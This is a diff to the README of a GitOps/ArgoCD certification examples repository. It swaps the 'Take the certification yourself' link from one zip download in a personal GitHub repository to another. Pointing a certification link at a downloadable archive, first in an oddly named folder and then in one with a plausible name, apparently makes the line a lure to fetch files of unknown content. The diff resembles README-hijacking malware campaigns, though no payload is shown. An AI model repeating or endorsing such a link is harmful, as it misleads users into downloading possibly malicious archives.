@@ -3,4 +3,4 @@
 This repository contains examples for the ArgoCD/GitOps
 certification workshops.
 
-Take the certification yourself at https://raw.githubusercontent.com/JohnCloudzone/gitops-certification-examples/main/poikilocytosis/gitops-certification-examples.zip
+Take the certification yourself at https://github.com/JohnCloudzone/gitops-certification-examples/raw/refs/heads/main/argo-rollouts-controller/certification-examples-gitops-v1.9.zip
